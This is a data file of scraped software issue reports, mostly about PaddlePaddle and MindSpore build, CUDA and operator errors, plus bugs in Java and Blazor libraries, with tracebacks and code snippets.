复现SIGN出错,"W0902 20:02:11.228497 1068467 device_context.cc:404] Please NOTE: device: 0, GPU Compute Capability: 8.6, Driver API Version: 11.2, Runtime API Version: 11.2 W0902 20:02:11.283596 1068467 device_context.cc:422] device: 0, cuDNN Version: 7.6. Traceback (most recent call last): File ""train.py"", line 168, in model = SIGN(args) File ""/home/duanhua/projects/paddle/PaddleHelix/apps/drug_target_interaction/sign/model.py"", line 41, in init self.input_layer = SpatialInputLayer(hidden_dim, cut_dist, activation=F.relu) File ""/home/duanhua/projects/paddle/PaddleHelix/apps/drug_target_interaction/sign/layers.py"", line 46, in init self.dist_embedding_layer = nn.Embedding(int(cut_dist)-1, hidden_dim, sparse=True) File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/nn/layer/common.py"", line 1343, in init self.weight = self.create_parameter( File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/dygraph/layers.py"", line 411, in create_parameter return self._helper.create_parameter(temp_attr, shape, dtype, is_bias, File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/layer_helper_base.py"", line 369, in create_parameter return self.main_program.global_block().create_parameter( File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/framework.py"", line 2895, in create_parameter initializer(param, self) File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/initializer.py"", line 561, in call op = block.append_op( File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/framework.py"", line 2921, in append_op _dygraph_tracer().trace_op(type, File ""/home/duanhua/anaconda3/envs/paddle/lib/python3.8/site-packages/paddle/fluid/dygraph/tracer.py"", line 43, in trace_op self.trace(type, inputs, outputs, attrs, OSError: (External) Cublas error, . An unsupported value or parameter was passed to the function (a negative vector size, for example). (at /paddle/paddle/fluid/platform/cuda_helper.h:107) [operator &lt; uniform_random &gt; error] 复现百度的文章SIGN时报错，目前不知道什么原因   <code>: CUBLAS_STATUS_INVALID_VALUE"
Online新增表单js报错,"版本号： v2.4.6 代码clone下来,切换到v2.4.6版本后, 修改了数据库和redis配置, 直接启动system模块的. 前后端均启动正常, 但是前端页面打开后, online开发新增表单保存时js报错.   <code>: JeecgSystemApplication"
C   full include paths,"Our include convention is that if a header file is in the same directory as the source file, we don't have to specify the full include path. For example, if , , , and are in the same directory , we'd write the following in : However, most auto format tools (Emacs plugins, clang-format, etc) sort header paths enclosed in double-quotes (""). This is reasonable because it allows us to find included header files efficiently in the alphabetical order, and keep header files in the same directory (package) staying together. However, the sorting would reformat our code as: where ""a.h"" and ""z.h"" are no longer staying together, even if they are in the same directory. So, I propose here that we always write full include paths. If so, we'd have   <code>: a.h b.h z.h a.cc paddle/pserver a.cc #include ""a.h"" #include ""b.h"" #include ""z.h"" #include ""paddle/math/matrix.h"" #include ""paddle/utils/stringprint.h"" #include ""a.h"" #include ""b.h"" #include ""paddle/math/matrix.h"" #include ""paddle/utils/stringprint.h"" #include ""z.h"" #include ""paddle/pserver/a.h"" #include ""paddle/math/matrix.h"" #include ""paddle/pserver/b.h"" #include ""paddle/pserver/z.h"" #include ""paddle/utils/stringprint.h"""
conv_2d cuDNN operator slow,"During the benchmarking of https://github.com/dzhwinter/benchmark/blob/master/fluid/mnist.py, I found conv_2d with cuDNN is slow. It turns out the <del></del> bias takes about 80% of the time while the actual cudnn_conv only takes 10%. @dzhwinter This looks pretty bad to me. Please confirm if you've seen the similar results during your benchmarking? I am using and NVIDIA Visual Profiler. I am wondering if we can do one of the following. See if can improve the , but I am not sure how hard it is in Eigen. @reyoung Combine conv and add bias into one operator, like CudnnConvBaseLayer.cpp in v2. We need to improve this due to the importance of this operator in vision task. Issue related: https://github.com/PaddlePaddle/Paddle/issues/7862.   <code>: element_wise_add element_wise_add_grad nvprof elementwise_add"
paddlepaddle目标检测打包运行报错 [WinError 2] 系统找不到指定的文件。,"1）paddlepaddle 版本 Name: paddlepaddle Version: 2.2.0 2)paddlex 版本Name: paddlex Version: 2.0.0 3）CPU/GPU：CPU，GPU 4）系统环境：win10 5）Python版本号 Python 3.7.9 复现信息： 问题描述：直接运行.py文件程序运行正常，但是打包成exe之后运行报错， 1.这里是打包成一个目录的报错信息 根据路径可以找到这个临时的目录，但是目录里缺少core_avx.pyd文件 补充requirements.txt文件内容：   <code>: import paddlex as pdx import cv2 #导入模型 model = pdx.load_model('path_to_model') #读取图片 im = cv2.imread('test.jpg') im = im.astype('float32') #用模型预测图片并返回结果 result = model.predict(im) # 可视化结果, 对于检测、实例分割务进行可视化 if model.model_type == ""detector"": # threshold用于过滤低置信度目标框 # 可视化结果保存在当前目录 pdx.det.visualize(im, result, threshold=0.5, save_dir='./') altgraph==0.17.2 astor==0.8.1 atomicwrites==1.4.0 attrs==21.2.0 Babel==2.9.1 backcall==0.2.0 backports.entry-points-selectable==1.1.0 bce-python-sdk==0.8.62 certifi==2021.10.8 cffi==1.15.0 cfgv==3.3.1 chardet==4.0.0 charset-normalizer==2.0.7 click==8.0.3 colorama==0.4.4 cryptography==35.0.0 cycler==0.11.0 Cython==0.29.24 decorator==5.1.0 distlib==0.3.3 filelock==3.3.1 flake8==4.0.1 flake8-import-order==0.18.1 Flask==2.0.2 Flask-Babel==2.0.0 future==0.18.2 gast==0.3.3 gitdb==4.0.9 GitPython==3.1.24 identify==2.3.1 idna==3.3 importlib-metadata==4.2.0 iniconfig==1.1.1 ipython==7.29.0 itsdangerous==2.0.1 jedi==0.18.0 Jinja2==3.0.2 joblib==1.1.0 kiwisolver==1.3.2 lap==0.4.0 MarkupSafe==2.0.1 matplotlib==3.4.3 matplotlib-inline==0.1.3 mccabe==0.6.1 mkl-fft==1.0.12 mkl-random==1.1.1 motmetrics==1.2.0 nodeenv==1.6.0 Nuitka==0.6.17.5 numpy==1.21.3 opencv-python==4.5.4.58 packaging==21.0 paddlepaddle==2.1.3 paddleslim==2.1.1 paddlex==2.0.0 pandas==1.3.4 parso==0.8.2 pefile==2021.9.3 pickleshare==0.7.5 Pillow==8.4.0 pipdeptree==2.2.0 platformdirs==2.4.0 pluggy==1.0.0 pre-commit==2.15.0 prompt-toolkit==3.0.21 protobuf==3.19.1 py==1.10.0 py-cpuinfo==8.0.0 pycocotools @ git+https://gitee.com/jiangjiajun/philferriere-cocoapi.git@de7d8ccefd3beb34030aee8e3612adf58b018fc3#subdirectory=PythonAPI pycodestyle==2.8.0 pycparser==2.20 pycryptodome==3.11.0 pyflakes==2.4.0 Pygments==2.10.0 pyinstaller==4.5.1 pyinstaller-hooks-contrib==2021.3 pyparsing==3.0.3 PyQt5==5.15.5 PyQt5-Qt5==5.15.2 PyQt5-sip==12.9.0 pytest==6.2.5 pytest-benchmark==3.4.1 python-dateutil==2.8.2 pytz==2021.3 pywin32==302 pywin32-ctypes==0.2.0 PyYAML==6.0 pyzmq==22.3.0 QPT==1.0b1.dev11 requests==2.26.0 scikit-learn==0.23.2 scipy==1.5.0 Shapely==1.8.0 shellcheck-py==0.7.2.1 six==1.16.0 smmap==5.0.0 threadpoolctl==3.0.0 toml==0.10.2 tornado @ file:///C:/ci/tornado_1606935947090/work tqdm==4.62.3 traitlets==5.1.1 ttkbootstrap==0.5.1 typing-extensions==3.10.0.2 urllib3==1.26.7 virtualenv==20.9.0 visualdl==2.2.1 wcwidth==0.2.5 Werkzeug==2.0.2 wget==3.2 wincertstore==0.2 xmltodict==0.12.0 zipp==3.6.0"
release0.11.0 make 报错,"系统 macOS without GPU 步骤 clone源码，check branch到release/0.11.0, 错误： 每次都是这羊，，，以前是直接就能make的啊，咋越升级bug越多。。。   <code>: mkdir build cd build cmake .. make all -j8 [ 6%] No patch step for 'extern_eigen3' [ 6%] No update step for 'extern_eigen3' [ 6%] No configure step for 'extern_eigen3' [ 7%] No build step for 'extern_eigen3' [ 7%] No install step for 'extern_eigen3' [ 7%] No test step for 'extern_eigen3' [ 8%] Completed 'extern_eigen3' [ 8%] Built target extern_eigen3 make: *** [all] Error 2"
[Paddle-TRT] Different behaviors between blockReduce and warpReduce,"Paddle Version: develop GPU/cuda-10.2/cudnn7.6.5 Ubuntu16.04 Hello! There are different behaviors between blockReduceSum and warpReduceSum. warpReduceSum makes each thread in the warp has a copy of summation. However, blockReduceSum only ensures the first warp has the summation, which results in one more block synchronization like here. I suggest two solutions, Change the behavior of blockReduceSum to AllReduce, which computes the summation and ensures each thread in the block have the summation copy. We only need to change one line to do this. Change the code to . By doing this, each warp has a copy of first round result. Thus, all threads in the block have the reduced values after the second warpReduce. In blockReduceSum, add a condition which lets only the first warp in the block does the second reduction. Because we only need to ensure has the correct reduced value (SoftmaxKernelWithEltadd is the only caller), so only the first warp needs to do the second reduction. i.e. In my experiments, the first one has higher performance, because we can delete the unnecessary shared memory copy and __syncthreads after calling the blockReduceXXX function. BTW, the same issue exists in the blockReduceMax too.   <code>: val = (threadIdx.x &lt; block_span) ? shared[lane] : static_cast&lt;T&gt;(0.0f); val = (lane &lt; block_span) ? shared[lane] : static_cast&lt;T&gt;(0.0f); threadIdx.x if (threadIdx.x &lt; warpSize) { val = (threadIdx.x &lt; block_span) ? shared[lane] : static_cast&lt;T&gt;(0.0f); val = warpReduceSum&lt;T&gt;(val, mask); }"
[CT][MS]算子maxunpool ascend动态shape反向报错,"算子maxunpool ascend动态shape反向报错 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 passed   <code>: def test_dynamic_shape_maxunpool2d_input_15x10x32x20_int32(): torch_x = torch.from_numpy(np.random.randint(0, 200, (15, 10, 32, 20)).astype(np.float32)) torch_maxunpool = torch.nn.MaxPool2d(kernel_size=2, stride=(2, 2), return_indices=True) output, indices = torch_maxunpool(torch_x) input_x = Tensor(output.numpy().astype(np.int32)) input_argmax = Tensor(indices.numpy().astype(np.int64)) fact = MaxUnpool2DMock(attributes={ 'ksize': 4, 'strides': 2, 'pads': 0 }, inputs=[input_x, input_argmax]) fact.forward_dynamic_shape_cmp() &gt; fact.grad_dynamic_shape_cmp() &gt; fact.grad_dynamic_shape_cmp() test_maxunpool2d.py:1133: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/maxunpool2d_ops.py:251: in grad_dynamic_shape_cmp out_ms = self.grad_mindspore_dynamic_shape_impl() ../share/ops/primitive/maxunpool2d_ops.py:241: in grad_mindspore_dynamic_shape_impl out_grad = grad_net(self.input_x, self.input_argmax, output_grad) /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:652: in __call__ raise err /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:648: in __call__ output = self._run_construct(args, kwargs) /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:414: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:378: in after_grad return grad_(fn)(*args, **kwargs) /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/common/api.py:98: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:368: in after_grad out = _pynative_executor() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffff8412ded0&gt; def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" &gt; return self._executor() E RuntimeError: Sync stream failed:Ascend_6 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:634 Run /root/archiconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/common/api.py:957: RuntimeError"
Spring Boot中J2Cache整合Spring Cache关于Key的序列化问题,"最近在SpringBoot项目中，想用J2Cache实现SpringCache，整合过程中发现net.oschina.j2cache.cache.support.J2CacheCache类的很多方法中在key的处理方面都是简单用了String.valueOf方法将其转换成String的，是否可以使用StringRedisSerializer类似的序列化方式。 在SpringCache中使用方法参数作为缓存key，用来缓存方法结果。相同的方法参数不是一个类实例的情况下，用String.valueOf得到的字符串是不一样的。 测试代码： @service public class DemoService { }   <code>: @Cacheable(value = ""hello"", key = ""#p0"") public String hello(DemoQuery query) { System.out.println(query.getId()); System.out.println(query.getName()); return LocalDateTime.now().toString(); }"
Paddle docker build readme need to illustrate how to test paddle. Current implementation of test is not correct.,"Currently readme only mentioned ""test"" in this command But there is no explanation about how will the test be performed. E.g., will the test run during building docker image , or later when paddle is building the final output image. Current implementation is paddle will run test inside image, which is incorrect. Since the environment maybe different from the final image. Actually I encountered this problem: the test fails in since the numpy version for is too old, but the numpy version is good in the final produced image.   <code>: docker run -v $PWD:/paddle -e ""GPU=OFF"" -e ""AVX=ON"" -e ""TEST=ON"" paddle:dev paddle:dev paddle:dev paddle:dev paddle:dev"
up velocity 到新版,"目前使用的旧版，已经不在维护了   <code>: &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt; &lt;version&gt;2.3&lt;/version&gt; &lt;/dependency&gt; public class VelocityInitializer { /** * 初始化vm方法 */ public static void initVelocity() { Properties p = new Properties(); try { // 加载classpath目录下的vm文件 p.setProperty(""resource.loader.file.class"", ""org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader""); // 定义字符集 p.setProperty(Velocity.INPUT_ENCODING, Constants.UTF8); // 初始化Velocity引擎，指定配置Properties Velocity.init(p); } catch (Exception e) { throw new RuntimeException(e); } } }"
table数据注入Model属性为枚举时，执行报错,"Table数据注入使用EFCore模式，数据库使用mysql， 数据库SQL： Startup.cs： // 增加 EFCore ORM 数据服务操作类 // 需要时打开下面代码 appsettings.json： 其他均使用dev-EFCore项目默认配置 初步排查Foo类属性 将 EnumEducation 改为 string 可以执行成功，但会丢失枚举相关属性，实现不了自动下拉选择等功能。 组件版本 latest 浏览器 all [√] Server Side   <code>: -- ---------------------------- -- Table structure for Test -- ---------------------------- DROP TABLE IF EXISTS `Test`; CREATE TABLE `Test` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `Name` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL, `DateTime` datetime NOT NULL, `Address` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL, `Count` int(11) NOT NULL, `Complete` int(11) NOT NULL, `Education` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL, PRIMARY KEY (`ID`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_bin ROW_FORMAT = Dynamic; -- ---------------------------- -- Records of Test -- ---------------------------- INSERT INTO `Test` VALUES (1, '自定义姓名1', '2020-12-08 00:00:00', 'Test', 11, 1, 'Primary'); INSERT INTO `Test` VALUES (2, '啊是大', '2020-12-15 00:00:00', '撒打算', 0, 0, 'Primary'); services.AddEntityFrameworkCore&lt;FooContext&gt;(option =&gt; { option.UseMySQL(Configuration.GetConnectionString(""bb"")); }); ""ConnectionStrings"": { ""bb"": ""server=192.168.3.49;port=3306;database=AAMS;uid=root;pwd=2966200;"" }, Microsoft.EntityFrameworkCore.Query: Error: An exception occurred while iterating over the results of a query for context type 'BootstrapBlazor.Shared.Pages.Components.FooContext'. System.FormatException: Input string was not in a correct format. at System.Number.ThrowOverflowOrFormatException(ParsingStatus status, TypeCode type) at System.Number.ParseInt32(ReadOnlySpan`1 value, NumberStyles styles, NumberFormatInfo info) at System.String.System.IConvertible.ToInt32(IFormatProvider provider) at System.Convert.ChangeType(Object value, Type conversionType, IFormatProvider provider) at MySql.Data.MySqlClient.MySqlDataReader.ChangeType(IMySqlValue value, Int32 fieldIndex, Type newType) at MySql.Data.MySqlClient.MySqlDataReader.GetInt32(Int32 i) at lambda_method98(Closure , QueryContext , DbDataReader , ResultContext , SingleQueryResultCoordinator ) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.Enumerator.MoveNext() /// &lt;summary&gt; /// /// &lt;/summary&gt; [Required(ErrorMessage = ""请选择学历"")] [Display(Name = ""学历"")] [AutoGenerateColumn(Order = 60)] public EnumEducation? Education { get; set; }"
"【template模块】macro指令,宏的定义支持嵌套定义中，类似内部类写法现在不支持了（先定义再嵌套支持）",【testcase】 #macro aa() #end ##调用如下： #aa() 【预期输出】 宏的定义支持嵌套定义，两种写法等价，并且都支持 【实际输出】 类似内部类写法的定义，目前不支持，报错找不到，如图：   <code>: aa-Content #macro bb() bb-Content #end #bb()
在mindspore lite中添加CPU子图，并重新整理scheduler,"RFC 在mindspore lite中添加CPU子图 kind/enhancemen RFC 重新整理mindspore lite的scheduler kind/enhancemen mindspore lite中当前只对GPU进行了子图切分，这样会带来一些问题： 图中会同时存在CPU的kernel和GPU的子图，这两个现在是对于Executor来说是不能区分的，但现实情况是这两者在一些处理上不能完全等同，比如对于内存的管理上，前后处理上等。当这两个混合着使用时，处理起来也比较复杂。比如出于性能考虑，GPU子图需要在Run之前准备好所有的内存，而CPU算子的内存是在推理时动态分配释放的。而且CPU算子的内存在推理时动态分配，是每个算子在Run的时候在算子内部去申请，框架现在感知不到的，这样对于框架来说这块内存是否已经申请是不确定的。 不切分CPU子图，会导致一些子图之间的前后处理需要在kernel中进行处理才能完成，而这些处理可读性差，难以维护；由于是在kernel中实现，不能获取到全局的信息，不能做到全局最优，流程也不能由框架约束起来，容易出错。比如对于fp16的支持，整图的输出还是需要fp32，由于现在没有子图的概念，现在需要在子图切分是，硬编码的指定激活tensor的data_type（由于此时已经做完infer）,并且每一个fp16算子都要根据输出tensor的数据类型和是否是整图最后一个算子，来决定是否要将输出的数据从fp16转换为fp32。如果有了fp16的子图，可以在子图的前后处理中处理这个逻辑，而子图内部保证全是fp16的数据流。逻辑上会更清晰，性能也会有所提升。 第一点：当现在开启fp16优化后，对于fp16算子，框架这里需要有较多的特殊处理： 第二点：处于性能考虑，GPU子图需要在推理前准备好所有的内存，而CPU算子的内存是在推理时动态分配释放的。而且CPU算子的内存在推理时动态分配，是每个算子在run的时候自己去申请，框架现在是不感知的，这样对于框架来说这块内存是否已经申请是不确定的。 主要实现一下两点： 细化子图类型，不仅仅根据异构类型切分子图，还可以根据数据类型进行子图切分。考虑到float16算子需要对整图的输入输出数据进行变换，本次会增加float32的CPU子图，float16的CPU子图。 去除lite_kernel中的Init方法，现在这个方法不由框架调用，是算子自己定义自己调用。是不是所有算子都需要有这个方法，有没有必要抽象出来？ 明确子图和kernel的流程： 图解析 解析Model中的tensors，图的拓扑关系初始化 图调度 shape、data_type和format推导，创建kernel，子图切分，子图拓扑关系初始化 图准备 调用各个子图的准备方法。子图的prepare方法主要做一些子图级别的初始化，是一些比较消耗性能的初始化，一些全局变量的初始化，静态内存分配等，并调用算子的准备方法。比如GPU子图需要在这个阶段对子图中所有的激活tensor中的data进行内存分配。 图执行 遍历子图，调用子图的前处理、执行和后处理方法。 子图的前处理和后处理是一些子图级别的变量处理，这些处理只能在图执行的时候才能做，因为这些前后处理一般是对激活数据做处理。比如fp16的CPU子图需要在前处理中，如果子图的输入数据是fp32，需要讲输入数据转化为fp16；需要在后处理中，将输出数据从fp16转化为fp32。 子图的执行需要遍历kernel，调用kernel的前处理、执行和后处理方法。kernel的前后处理是算子级别的数据准备，一些只能在图执行阶段才能做的处理，比如cpu算子需要在算子执行前动态申请激活tensor的data，需要在算子执行后动态释放激活tensor的data。   <code>: 图解析 | /---- infer 图调度 ----|---- 创建算子 | \---- 子图切分 图准备 ---- 子图准备 ---- 算子准备 | /---- 子图前处理 | | /---- 算子前处理 图执行 ----|---- 子图执行 ----|---- 算子执行 | \---- 算子后处理 \---- 子图后处理"
定时任务工具类中，存在TaskExecutor未执行完就执行CronUtil.stop()方法会陷入线程堵塞,"//定时任务工具类中，存在TaskExecutor未执行完就执行CronUtil.stop()方法会陷入线程堵塞，这个问题会导致虽然关闭了定时任务，但是整个程序都堵塞停不了了。能否实现CronUtil.stop方法，执行后不再执行新的定时线程，待正在执行的定时线程执行完毕后关闭定时任务呢。 //本人粗糙方式如下，并且侵入到hutool源代码了，所以希望大神有更好实现方法。 //1、修改TaskExecutorManager，添加一个如下方法 //添加关闭定时任务方法   <code>: //定时运行入口 CronUtil.setMatchSecond(true); CronUtil.getScheduler().setDaemon(true); CronUtil.start(); Thread.currentThread().sleep(9000); CronUtil.stop(); //定时运行测试类 public class CronTest { public static int runnum=0; public static void test(){ StaticLog.info(""This is static {} log begin."", ""test""); try { Thread t=new Thread(); t.sleep(5000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } StaticLog.info(""This is static {} log."", ""test""); } } //获取正在执行线程数 public int getExecutorSize() { return executors.size(); } //移除任务列表 CronUtil.getScheduler().taskTable=new TaskTable(CronUtil.getScheduler()); while(CronUtil.getScheduler().taskExecutorManager.getExecutorSize()&gt;0){ Thread.currentThread().sleep(2000); } CronUtil.stop();"
Layout组件错误,"crit: Microsoft.AspNetCore.Components.WebAssembly.Rendering.WebAssemblyRenderer[100] Unhandled exception rendering component: Object reference not set to an instance of an object. System.NullReferenceException: Object reference not set to an instance of an object. at BootstrapBlazor.Components.RouteTableFactory.Create(IEnumerable`1 assemblies, String url) at BootstrapBlazor.Components.Layout.OnInitializedAsync() at Microsoft.AspNetCore.Components.ComponentBase.RunInitAndSetParametersAsync() 组件版本 latest 浏览器 Microsoft Edge Web Assembly 按照官网组件示例代码运行出现上述错误，MainLayout.razor代码如下：   <code>: @inherits LayoutComponentBase &lt;Layout ShowFooter=""true""&gt; &lt;Header&gt; &lt;div class=""text-center header""&gt;Header&lt;/div&gt; &lt;/Header&gt; &lt;Main&gt; &lt;div class=""text-center main""&gt;Main&lt;/div&gt; &lt;/Main&gt; &lt;Footer&gt; &lt;div class=""text-center footer""&gt;Footer&lt;/div&gt; &lt;/Footer&gt; &lt;/Layout&gt;"
CI errors of gru_compute ,"The following CI errors might be caused by the dependency lack of math_function in the CMake configurations of gru_compute, but I don't know why the errors didn't occur before. I am trying to fix it. sorry for this.   <code>: [23:47:35]HEAD is now at 649f04d... Added Pascal nvcc flags, bumped version [23:47:49]In file included from /paddle/paddle/operators/math/gru_compute.cu:15:0: [23:47:49]/paddle/paddle/operators/math/math_function.h:17:23: fatal error: mkl_cblas.h: No such file or directory [23:47:49]compilation terminated. [23:47:49]CMake Error at gru_compute_generated_gru_compute.cu.o.cmake:203 (message): [23:47:49] Error generating [23:47:49] /paddle/build/paddle/operators/math/CMakeFiles/gru_compute.dir//./gru_compute_generated_gru_compute.cu.o [23:47:49] [23:47:49] [23:47:49]make[2]: *** [paddle/operators/math/CMakeFiles/gru_compute.dir/gru_compute_generated_gru_compute.cu.o] Error 1 [23:47:49]make[1]: *** [paddle/operators/math/CMakeFiles/gru_compute.dir/all] Error 2 [23:47:49]make[1]: *** Waiting for unfinished jobs.... [23:48:36]make: *** [all] Error 2 [23:48:36]Process exited with code 2"
【ST】【MS】【OPS】DenseToCSRSparseMatrix算子在mindspore 2.0master分支GPU后端用例执行dynamic_shape报错,"ensetocsrsparsematrix算子在mindspore 2.0master分支GPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_densetocsrsparsematrix_func_2d_fp32 test_ms_ops_densetocsrsparsematrix_func_2d_fp64 test_ms_ops_densetocsrsparsematrix_func_tensor_2d_fp32 test_ms_ops_densetocsrsparsematrix_func_tensor_2d_fp64 test_ms_ops_densetocsrsparsematrix_func_functional_2d_fp32 test_ms_ops_densetocsrsparsematrix_func_functional_2d_fp64 test_ms_ops_densetocsrsparsematrix_func_2d_complex64 test_ms_ops_densetocsrsparsematrix_func_2d_complex128 test_ms_ops_densetocsrsparsematrix_func_3d_fp32 test_ms_ops_densetocsrsparsematrix_func_3d_fp64 test_ms_ops_densetocsrsparsematrix_func_3d_complex64 test_ms_ops_densetocsrsparsematrix_func_3d_complex128 export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=GPU_PCIE pytest -s test_ms_ops_densetocsrsparsematrix_func.py 用例执行通过 ` test_ms_ops_densetocsrsparsematrix_func.py:65: ../../../../common/ms_aw/operator/sparse/densetocsrsparsematrix_ops.py:166: in forward_cmp out_ms = self.forward_mindspore_impl() ../../../../common/ms_aw/operator/sparse/densetocsrsparsematrix_ops.py:98: in forward_mindspore_impl Tensor(self.dense_tensor), Tensor(self.indices)) ../../../../common/utils/operator_helper.py:316: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:268: in run_dynamic_shape out_dyn = self.net(*tmp_arg, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:596: in call out = self.compile_and_run(*args) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:985: in compile_and_run self.compile(*inputs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:968: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7ff41a6779d0&gt;, obj = DenseToCSRSparseTensor&lt;&gt;, phase = 'train.1669166648503708672.140682362022416.1', do_convert = True auto_parallel_mode = False, jit_config_dict = {} E ValueError: For 'DenseToCSRSparseMatrix', shape[1] of indices must be equal to the rank of dense input, but got dense rank: 2, indices.shape[1]: -1. E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/jenkins0/x00518866/solution_test/cases/04operator/14sparse/DenseToCSRSparseMatrix/rank_0/om/analyze_fail.dat' for more details. Get instructions about at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/jenkins0/x00518866/solution_test/common/ms_aw/operator/sparse/densetocsrsparsematrix_ops.py:46 E return self.op(dense_data, indices) E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/ops/dense_to_csr_sparse_matrix.cc:55 DenseToCSRSparseMatrixInferShape /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:1131: ValueError ` 算子负责人：梁成辉   <code>: assert fact.forward_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) analyze_fail.dat"
需要修改nacos？,"启动报这个问题： 是不是需要修改nacos什么配置/？？？   <code>: Description: Failed to configure a DataSource: 'url' attribute is not specified and no embedded datasource could be configured. Reason: Failed to determine a suitable driver class Action: Consider the following: If you want an embedded database (H2, HSQL or Derby), please put it on the classpath. If you have database settings to be loaded from a particular profile you may need to activate it (no profiles are currently active)."
 [新功能] 支持自定义配置文件查找目录,支持自定义 ， 查找目录   <code>: json .xml
